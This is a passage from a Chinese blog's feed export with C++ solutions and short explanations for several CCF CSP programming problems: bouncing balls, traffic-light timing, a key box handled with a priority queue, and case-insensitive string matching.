        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201803-2">CCF-201803-2</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904113015783.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu">我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/202009041423310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904142341740.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904142350892.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="3"></p><h3><span id="peng-zhuang-de-xiao-qiu-ru-guo-hui-fan-dan-na-zhe-ge-ti-mu-wo-men-zhi-neng-mo-ni">碰撞的小球如果会反弹，那这个题目，我们只能模拟</span></h3><h5><span id="jie-ti-si-lu">解题思路</span></h5><p>1.初始化每个球的位置后，然后1s 1s的加，然后位置加，碰到了就反弹，就这样</p><h5><span id="dai-ma">代码</span></h5><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;map></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">struct</span> node<span class="token punctuation">{</span>    <span class="token keyword">int</span> index<span class="token punctuation">;</span>    <span class="token keyword">int</span> dir<span class="token punctuation">;</span><span class="token punctuation">}</span>a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>l<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>l<span class="token operator">>></span>t<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">;</span>      a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>dir<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">while</span><span class="token punctuation">(</span>t<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>dir<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>           <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token operator">==</span>l<span class="token punctuation">)</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>dir<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>dir<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token operator">++</span><span class="token punctuation">;</span>           <span class="token keyword">else</span> a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token operator">--</span><span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">!=</span>j<span class="token operator">&amp;&amp;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token operator">==</span>a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">{</span>                 a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>dir<span class="token operator">*</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                 a<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>dir<span class="token operator">*</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                 <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cout<span class="token operator">&lt;&lt;</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><h3><span id="wo-men-jia-she-xiao-qiu-bu-hui-fan-dan-er-shi-zhi-neng-chuan-guo">我们假设小球不会反弹而是只能穿过</span></h3><h5><span id="jie-ti-si-lu-zhe-ge-hen-qiao-miao">解题思路（这个很巧妙）</span></h5><p>1.由于每个球都是相同的，碰撞反向我们可以直接看成是小球穿过了彼此<br>2.但是问题来了，我们要输出的位置和原来球的下标i有关，如果完全看成是一样的球，就无法完成这个指标了，如何解决？<br>3.由于球会碰撞，所以，球的排名永远不会变，是不是很惊喜！<br>4.我们通过可以穿过球，可以很快的算出球的结束时间的位置<br>5.结束位置一个排序，初始位置一个排序<br>6.用map将初试位置的值和排名关联起来<br>7.使用初始位置的排名访问结束位置</p><h5><span id="dai-ma">代码</span></h5><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;algorithm></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;map></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">;</span> <span class="token keyword">int</span> a<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//球位置原始数据 </span><span class="token keyword">int</span> b<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//球位置原始数据排序</span><span class="token keyword">int</span> c<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//球的结果数据排序 </span>map<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token punctuation">,</span><span class="token keyword">int</span><span class="token operator">></span> m<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//输入球原始数据排第几个球 </span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>l<span class="token punctuation">,</span>t<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>l<span class="token operator">>></span>t<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cin<span class="token operator">>></span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>t<span class="token punctuation">;</span>      c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">%</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>l<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>l<span class="token punctuation">)</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>l<span class="token operator">-</span>c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">sort</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span>b<span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">sort</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span>c<span class="token operator">+</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      m<span class="token punctuation">[</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      cout<span class="token operator">&lt;&lt;</span>c<span class="token punctuation">[</span>m<span class="token punctuation">[</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><h3><span id="di-er-chong-si-lu-hen-bang-shi-ba">第二种思路很棒是吧！</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904142401547.png#pic_center" alt="结果"><br>第二种思路好，内存好像多一点点，哈哈！</p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 巧妙思想 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF小明放学---震惊，小明放学竟用一维数学模型解决！</title>
      <link href="/2020/09/04/xiaomingfangxue/"/>
      <url>/2020/09/04/xiaomingfangxue/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201812-2">CCF-201812-2</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904113015783.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu">我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904153331327.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"></p><h3><span id="zen-me-ge-yi-wei-shu-xue-mo-xing-ni">怎么个一维数学模型呢？</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904154218171.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="模型图"></p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">define</span> ll long long</span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> r<span class="token punctuation">,</span>g<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    cin<span class="token operator">>></span>r<span class="token operator">>></span>y<span class="token operator">>></span>g<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token punctuation">;</span>    ll sum<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> k<span class="token punctuation">;</span>      ll t<span class="token punctuation">;</span>      cin<span class="token operator">>></span>k<span class="token operator">>></span>t<span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> t<span class="token operator">=</span>r<span class="token operator">-</span>t<span class="token operator">+</span>sum<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span> t<span class="token operator">=</span>r<span class="token operator">+</span>g<span class="token operator">-</span>t<span class="token operator">+</span>sum<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span> t<span class="token operator">=</span>r<span class="token operator">+</span>g<span class="token operator">+</span>y<span class="token operator">-</span>t<span class="token operator">+</span>sum<span class="token punctuation">;</span>          t<span class="token operator">%</span><span class="token operator">=</span><span class="token punctuation">(</span>r<span class="token operator">+</span>y<span class="token operator">+</span>g<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token operator">>=</span><span class="token number">0</span><span class="token operator">&amp;&amp;</span>t<span class="token operator">&lt;=</span>r<span class="token punctuation">)</span>  sum<span class="token operator">+</span><span class="token operator">=</span>r<span class="token operator">-</span>t<span class="token punctuation">;</span>          <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token operator">>=</span>r<span class="token operator">+</span>g<span class="token operator">&amp;&amp;</span>t<span class="token operator">&lt;=</span>r<span class="token operator">+</span>g<span class="token operator">+</span>y<span class="token punctuation">)</span> sum<span class="token operator">+</span><span class="token operator">=</span>r<span class="token operator">+</span>y<span class="token operator">+</span>g<span class="token operator">-</span>t<span class="token operator">+</span>r<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token keyword">else</span> sum<span class="token operator">+</span><span class="token operator">=</span>t<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cout<span class="token operator">&lt;&lt;</span>sum<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3><span id="zhu-yi-xiang">注意项</span></h3><p><strong>不用long long只能拿60分哦</strong>![结果]](<a href="https://img-blog.csdnimg.cn/20200904154354984.png#pic_center" target="_blank" rel="noopener">https://img-blog.csdnimg.cn/20200904154354984.png#pic_center</a>)</p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图论 </tag>
            
            <tag> 数学思维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF公共钥匙盒---优先队列真的很棒！</title>
      <link href="/2020/09/04/gonggongyaoshihe/"/>
      <url>/2020/09/04/gonggongyaoshihe/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201709-2">CCF-201709-2</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904164152893.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu">我们先来看一下题目</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904164453816.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904164501905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="2"></p><h3><span id="jie-ti-si-lu">解题思路</span></h3><p>你不要看着题目这样，好像要考虑很多东西，优先队列就是干这个的，给个排序规则自动排序，而这个题我们要对时间排序，先来后到，然后还取，先还都取，同时还，小号先还。<br><strong>优先队列，冲!</strong></p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;queue></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">struct</span> node<span class="token punctuation">{</span>    <span class="token keyword">char</span> op<span class="token punctuation">;</span>    <span class="token keyword">int</span> time<span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">bool</span> <span class="token keyword">operator</span> <span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token keyword">const</span> node a<span class="token punctuation">)</span><span class="token keyword">const</span><span class="token punctuation">{</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>time<span class="token operator">!=</span>time<span class="token punctuation">)</span> <span class="token keyword">return</span> a<span class="token punctuation">.</span>time<span class="token operator">&lt;</span>time<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>a<span class="token punctuation">.</span>op<span class="token operator">!=</span>op<span class="token punctuation">)</span> <span class="token keyword">return</span> a<span class="token punctuation">.</span>op<span class="token operator">></span>op<span class="token punctuation">;</span>      <span class="token keyword">else</span> <span class="token keyword">return</span> a<span class="token punctuation">.</span>num<span class="token operator">&lt;</span>num<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span>maxn<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    priority_queue<span class="token operator">&lt;</span>node<span class="token operator">></span> q<span class="token punctuation">;</span>    node t<span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    cin<span class="token operator">>></span>n<span class="token operator">>></span>k<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>k<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      <span class="token keyword">int</span> w<span class="token punctuation">,</span>s<span class="token punctuation">,</span>c<span class="token punctuation">;</span>      cin<span class="token operator">>></span>w<span class="token operator">>></span>s<span class="token operator">>></span>c<span class="token punctuation">;</span>      t<span class="token punctuation">.</span>op<span class="token operator">=</span><span class="token string">'G'</span><span class="token punctuation">;</span>      t<span class="token punctuation">.</span>num<span class="token operator">=</span>w<span class="token punctuation">;</span>      t<span class="token punctuation">.</span>time<span class="token operator">=</span>s<span class="token punctuation">;</span>      q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>      t<span class="token punctuation">.</span>op<span class="token operator">=</span><span class="token string">'R'</span><span class="token punctuation">;</span>      t<span class="token punctuation">.</span>time<span class="token operator">=</span>s<span class="token operator">+</span>c<span class="token punctuation">;</span>      q<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      t<span class="token operator">=</span>q<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      q<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span>op<span class="token operator">==</span><span class="token string">'G'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>          <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>t<span class="token punctuation">.</span>num<span class="token punctuation">)</span> <span class="token punctuation">{</span>                ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>          <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>t<span class="token punctuation">.</span>num<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>          <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span>n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>      cout<span class="token operator">&lt;&lt;</span>ans<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span><span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3><span id="you-xian-dui-lie-priority-queue-de-api">优先队列priority_queue的API</span></h3><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/2020090416534320.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="queue-API"></p>]]></content>
      
      
      <categories>
          
          <category> CCF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL-queue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCF字符串匹配---String::find()&amp;&amp; tolower()</title>
      <link href="/2020/09/04/zifuchuanpipei/"/>
      <url>/2020/09/04/zifuchuanpipei/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1><span id="ccf-201409-3">CCF-201409-3</span></h1><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904182615843.GIF#pic_center" alt="下面都不会了"></p><h2><span id="wo-men-xian-lai-kan-yi-xia-ti-mu-zen-me-shuo">我们先来看一下题目怎么说</span></h2><p><img src="/images/loading.gif" data-original="https://img-blog.csdnimg.cn/20200904182650141.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyMTM2ODMy,size_16,color_FFFFFF,t_70#pic_center" alt="1"><br><strong>同学们看完题目就要说我了，你好蔡哦！<br>题目确实不难，主要是介绍一个find()和tolower()和toupper()函数</strong></p><h3><span id="dai-ma">代码</span></h3><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;iostream></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;cstring></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span>string <span class="token function">lower</span><span class="token punctuation">(</span>string str<span class="token punctuation">)</span><span class="token punctuation">{</span>    string temp<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>str<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>      temp<span class="token operator">+</span><span class="token operator">=</span><span class="token function">tolower</span><span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    string str<span class="token punctuation">;</span>    <span class="token keyword">int</span> flag<span class="token punctuation">,</span>n<span class="token punctuation">;</span>    cin<span class="token operator">>></span>str<span class="token operator">>></span>flag<span class="token operator">>></span>n<span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>n<span class="token 